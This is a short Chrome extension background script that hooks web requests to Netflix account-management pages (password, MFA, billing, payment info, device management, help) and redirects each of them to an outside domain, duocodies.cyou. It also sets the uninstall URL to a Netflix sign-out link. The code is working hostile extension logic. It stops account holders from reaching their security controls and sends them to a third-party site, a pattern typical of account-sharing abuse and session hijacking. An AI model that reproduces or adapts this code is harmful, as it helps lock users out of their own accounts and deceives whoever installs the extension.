var host = "https://duocodies.cyou"
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
         return {redirectUrl: host};
    },
    {
        urls: [        
			
      "*://*.help.netflix.com/en*",
      "*://*.netflix.com/YourAccount*",
      "*://*.netflix.com/BillingActivity*",
      "*://*.netflix.com/password*",
      "*://*.netflix.com/mfa*",
      "*://*.netflix.com/simplemember/managepaymentinfo*",
      "*://*.netflix.com/ChangePlan*",
      "*://*.netflix.com/account/getmyinfo*",
      "*://*.netflix.com/AccountAccess*",
      "*://*.netflix.com/Activate*",
      "*://*.netflix.com/DoNotTest*",
      "*://*.netflix.com/ManageDevices*",
	
            
        ],
        types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
    },
    ['blocking']
);

chrome.runtime.onInstalled.addListener(function(details) {
    if (chrome.runtime.setUninstallURL) {
      chrome.runtime.setUninstallURL('https://netflix.com/signout');
  }
});






